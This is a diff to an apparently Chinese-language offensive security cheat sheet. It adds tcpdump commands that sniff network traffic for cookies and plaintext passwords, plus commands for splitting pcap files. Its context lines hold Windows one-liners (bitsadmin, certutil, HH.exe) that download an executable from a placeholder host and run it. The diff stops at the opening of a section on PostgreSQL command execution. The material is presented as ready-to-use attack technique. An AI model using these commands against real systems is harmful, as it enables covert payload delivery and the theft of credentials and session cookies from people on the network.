@@ -316,6 +316,24 @@ cmd.exe /c bitsadmin /transfer f370 http://x.x.x.x/as %APPDATA%\f370.exe&%APPDAT
 certutil.exe -urlcache -split -f https://x.x.x.x/version.txt   file.txt
 HH.exe http://x.x.x.x/test.exe c:\\test.exe	//适用于sqltools
 ```
+# tcpdump
+```
+tcpdump -i eth1 -s0 -w tcpdump.pcap	//指定网卡，-s0会将大小设置为无限制-如果您要捕获所有流量，请使用此大小。如果要从网络流量中提取二进制文件/文件，则需要。-w保存文件
+tcpdump -i eth1 src host 192.168.1.1 -w tcpdump.pcap	//指定源地址
+tcpdump -i eth1 dst host 192.168.1.1 -w tcpdump.pcap	//指定目的地址
+tcpdump -i eth1 port 25	-w tcpdump.pcap //抓取所有经过 eth1，目的或源端口是 25 的网络数据
+tcpdump -i eth1 -s 0 -A -vv 'tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420' -w tcpdump.pcap	//抓取get请求
+tcpdump -i eth1 -s 0 -A -vv 'tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504f5354' -w tcpdump.pcap //抓取post请求
+tcpdump -i eth1 -nn -A -s0 -l -w tcpdump.pcap | egrep -i 'Set-Cookie|Host:|Cookie:'	//抓取cookie
+tcpdump -i eth1 -s 0 -A -n -l -w tcpdump.pcap | egrep -i "POST /|GET /|pwd=|passwd=|password=|os_password=|user[password]=|Host:"	//抓取post/get明文密码
+tcpdump -p -vv -s 0 -w tcpdump.pcap	//不指定网卡嗅探
+tcpdump -i any -s 0 -w tcpdump.pcap	//当机器有多个网卡，不确定流量走哪个时，使用这个选项
+```
+## tcpdump拆分PCAP文件
+```
+tcpdump -r <input_pcap> -w <output_pcap> -C <file_size>	//input_pcap是您要拆分的文件的名称，output_pcap是输出，而<file_size>是拆分文件的近似大小以兆字节为单位。
+tcpdump -r input_packet_capture.pcap -w output_packet_capture.pcap -C 25	//将文件拆分为约25mb的块
+```
 # postgresql命令执行
 使用数据库获取系统信息
 ```
